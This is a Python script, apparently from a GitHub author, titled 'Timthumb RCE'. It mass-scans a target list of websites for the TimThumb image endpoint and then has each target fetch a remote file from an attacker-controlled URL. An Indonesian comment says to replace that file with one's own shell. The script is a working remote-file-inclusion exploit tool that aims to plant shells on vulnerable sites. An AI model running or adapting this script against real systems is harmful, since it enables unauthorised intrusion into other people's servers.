import requests
import os
import pyfiglet

# === BANNER ===
os.system("cls" if os.name == "nt" else "clear")
banner = pyfiglet.figlet_format("Timthumb RCE")
print(banner)
print("  Github @karranwang")

# === CONFIGURABLE ===
target_file = "targets.txt"
log_file = "scan_log.txt"
result_folder = "results"
test_image_url = "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
rfi_test_url = "https://karranwang.id/Min1Sh3lL.png"  # ubah sesuai keinginan,gunakan shell atau ektensi lain URL milikmu

# === HEADER SETUP ===
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"
}

# === PREPARE ===
if not os.path.exists(result_folder):
    os.mkdir(result_folder)

if os.path.exists(log_file):
    os.remove(log_file)

# === LOAD TARGETS ===
try:
    with open(target_file, "r") as f:
        targets = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[!] File {target_file} tidak ditemukan.")
    exit()

# === MAIN SCAN ===
for target in targets:
    print(f"\n[*] Menguji: {target}")
    status = "UNKNOWN"
    filename = result_folder + "/" + target.replace("https://", "").replace("http://", "").replace("/", "_") + ".jpg"

    try:
        params = {"src": test_image_url}
        response = requests.get(target, params=params, headers=headers, timeout=10)

        with open(filename, "wb") as f:
            f.write(response.content)

        with open(filename, "rb") as f:
            content = f.read(500)

        try:
            text = content.decode("utf-8")
            if "not allowed" in text.lower() or "forbidden" in text.lower():
                status = "BLOCKED / WHITELIST"
                print("[!] Akses ke domain eksternal ditolak (whitelist aktif)")
            else:
                status = "HTML RESPONSE"
                print("[!] Respon server bukan gambar, kemungkinan HTML")
        except UnicodeDecodeError:
            status = "ACTIVE / IMAGE RETURNED"
            print("[✓] Endpoint aktif dan mengembalikan gambar!")

            # Tambahan: uji RFI (opsional)
            print("[+] Menguji kemungkinan RFI...")
            rfi_params = {"src": rfi_test_url}
            rfi_resp = requests.get(target, params=rfi_params, headers=headers, timeout=10)
            if rfi_test_url.split("/")[-1] in rfi_resp.text:
                status = " POSSIBLE RFI VULNERABILITY"
                print("[!!] RFI payload berhasil dijalankan! (respon berisi konten remote)")
            else:
                print("[-] RFI payload tidak berhasil")

    except Exception as e:
        status = f"ERROR: {str(e)}"
        print(f"[!] Error saat menguji: {e}")

    # Log hasil
    with open(log_file, "a") as log:
        log.write(f"{target} = {status}\n")
